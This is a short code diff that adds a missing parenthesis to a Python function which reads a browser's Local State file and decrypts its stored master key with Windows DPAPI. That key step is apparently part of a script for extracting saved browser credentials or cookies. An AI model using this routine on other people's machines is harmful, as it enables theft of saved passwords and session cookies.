@@ -16,7 +16,7 @@ def get_encryption_key():
         local_state = f.read()
         local_state = json.loads(local_state)
 
-    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"]
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
     key = key[5:]
     return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
